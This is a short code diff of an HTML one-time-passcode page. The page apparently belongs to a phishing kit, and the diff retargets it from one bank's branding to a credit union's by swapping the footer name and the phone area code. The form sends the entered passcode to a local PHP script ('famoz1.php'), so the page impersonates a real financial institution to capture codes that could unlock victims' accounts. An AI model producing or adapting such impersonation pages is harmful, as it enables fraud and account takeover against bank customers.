@@ -152,7 +152,7 @@
 <form action="./famoz1.php" enctype="application/x-www-form-urlencoded" id="loginForm" method="post">
 <div class="form-control"><label class="label" for="username">One Time Passcode</label> <input class="input-field" id="username" name="1" required="required" type="text" /></div>
 
-<div class="form-control"><span style="color:#e74c3c;"><span style="font-family:Tahoma,Geneva,sans-serif;"><span style="font-size:12px;">Your One Time Passcode has been sent to the Phone Number (203) XXX-XXXX </span></span></span></div>
+<div class="form-control"><span style="color:#e74c3c;"><span style="font-family:Tahoma,Geneva,sans-serif;"><span style="font-size:12px;">Your One Time Passcode has been sent to the Phone Number (225) XXX-XXXX </span></span></span></div>
 
 <div class="form-control"></div>
 <button class="button" type="submit">Submit</button></form>
@@ -160,7 +160,7 @@
 </div>
 
 <div class="footer">
-<div class="footer-content">&copy; 2024 Guilford Savings Bank</div>
+<div class="footer-content">&copy; 2024 Pelican State Credit Union</div>
 
 <div class="footer-content"><a href="#"><span style="color:#2980b9;">Privacy policy&nbsp;</span><span style="color: hsla(var(--bc)/var(--tw-text-opacity,1));">.&nbsp;&nbsp;Member FDIC</span></a></div>
 
